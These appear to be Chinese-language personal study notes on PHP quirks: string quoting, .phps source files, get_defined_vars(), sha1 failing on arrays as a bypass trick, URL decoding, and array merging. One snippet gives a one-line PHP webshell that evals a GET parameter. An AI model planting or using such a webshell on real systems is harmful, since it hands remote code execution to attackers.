## PHP中的一些未整理完的东西
>持续更新
### 关于PHP字符串中的引号

PHP的字符串中，双引号完全支持转义字符，也支持在打印里面的变量（如果不想打印，需要写成\$）。

单引号，除非是要在单引号里面打印单引号，需要进行转义。否则，单引号中不支持其它任何形式的转义。
```php
//只有这种情况是可以转义的
$a = 'I\'m a good man.';
//打印结果为：I'm a good man.
//其它情况
$b = "hah";
$c = "a";
$a = '$b $c';
//打印结果为：$b $c
```
### PHP源码文件

有时候源码会写在后缀为phps的文件里，比较坑。
>https://zhidao.baidu.com/question/43693848.html

#### get_defined_vars()
该函数会返回一个数组，里面包含当前所有已经定义的服务器变量，环境变量和用户变量。
```php
//利用该函数可以构造一句话木马
@eval(get_defined_vars()['_GET']['cmd']);
```

#### 可以执行系统命令
https://blog.csdn.net/Auuuuuuuu/article/details/88778852

https://cloud.tencent.com/info/8ceed38d46829f15abfea34a9b82a7ff.html 

#### sha1函数
sha1函数不能加密数组，返回值为false。

该特性经常被用于一些绕过之中。

#### urldecode
当一个url被访问的时候，php会先将url进行url解码一次。使用的方法可参考如下博文。

>https://www.cnblogs.com/xccjmpc/p/3348710.html

#### php数组
PHP的数组之间可以互相合并，可以使用+运算符，或者array_merge()函数进行合并。但是二者的效果是不一样的。

对于array_merge()函数，如果输入的数组中有相同的字符串键名，则该键名后面的值将覆盖前一个值。然而，如果数组包含数字键名，后面的值将不会覆盖原来的值，而是附加到后面。

对于+，则是+左边的参数可以覆盖+右边的参数。
```php
<?php

$a = array("cat","dog");
$b = array("flag","fff","test");
var_dump($a+$b);
echo "<br>";
$c = array_merge($a,$b);
var_dump($c);
?>
```
结果
```txt
array(3) { [0]=> string(3) "cat" [1]=> string(3) "dog" [2]=> string(4) "test" } 
array(5) { [0]=> string(3) "cat" [1]=> string(3) "dog" [2]=> string(4) "flag" [3]=> string(3) "fff" [4]=> string(4) "test" }
```